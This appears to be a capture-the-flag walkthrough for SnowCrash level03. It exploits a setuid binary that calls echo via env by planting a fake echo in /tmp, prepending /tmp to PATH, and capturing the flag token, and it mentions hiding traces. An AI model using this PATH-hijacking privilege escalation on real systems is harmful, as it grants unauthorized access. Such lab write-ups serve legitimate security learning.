# level03

## Hint

There is a file in the home directory:

```shell-session
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

We can see it's executable by people from the `level03` group, and belong to the flag user whose code we are looking for, and when we do launch it the following displays:

```shell-session
level03@SnowCrash:~$ ./level03
Exploit me
```

Furthermore, and as stated [here](https://askubuntu.com/questions/431372/what-does-s-permission-means), we know that the `setuid bit` of that file means the following:
> s(setuid) means set user ID upon execution. If setuid bit turned on a file, user executing that executable file gets the permissions of the individual or group that owns the file.

## cat 

Feeding that file to the cat command will display some information on the content of the binary files, among which, and most importantly:

>                 h�h �h(�h0�1���TRQV��U��=u?�99���[]Ít&'U�tt	�$�ÐU����D$�D$D$DD$D$D$$�D$DD$D�$ÐU�f�Ћu�[]ÐS��[���[�/usr/bin/env echo Exploit me0pLp��zR|

The binary quite obviously calls `echo` from inside the code using `/usr/bin/env`, meaning we have a lead towards the nature of the vulnerability, the environment in which the code is executed.

## echo

As said previously, the executable belongs to `flag03`. So if we somehow managed to change the current environment in order to call `getflag` and not `echo`, the ownership rights of the binary (belonging to our target `flag03`) would permit us to overcome the limitations of being `level03`.

To do that, we should simply make a binary called `echo` place it before the `real echo` in the `PATH` and call getflag inside that program.

## No rights

A new problem arises, we do not have the rights to creating a file in the home directory.
We therefore need to find a directory that allows us to write into it.

A quick launch of the following command will allow us to find that:

```shell-session
level03@SnowCrash:~$ ls -l /
[...]
d-wx-wx-wx  4 root root  100 May  4 12:06 tmp
[...]
```

There are other directories that allow us to do that, but in the context of an exploit, it would make more sense to create our evil executable in `tmp` since this directory is regularly cleared by the system, thus erasing traces of our exploitation.

### new echo

```shell-session
level03@SnowCrash:~$ which getflag
/bin/getflag
level03@SnowCrash:~$ cp /bin/getflag /tmp/echo
level03@SnowCrash:~$ chmod 777 /tmp/echo
```

We now have an executable file `getflag` that is named `echo` in the `/tmp` directory.

## PATH

The last step is to place our `new echo` before the original one, and the shell will do the rest of the work for us by searching in the `PATH` and finding it when the `level03` binary is executed.

The way forward is easy, just prepend the `tmp` directory to the `PATH`

```shell-session
level03@SnowCrash:~$ export PATH=/tmp/:$PATH && echo $PATH
/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

## Exploit me

```shell-session
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
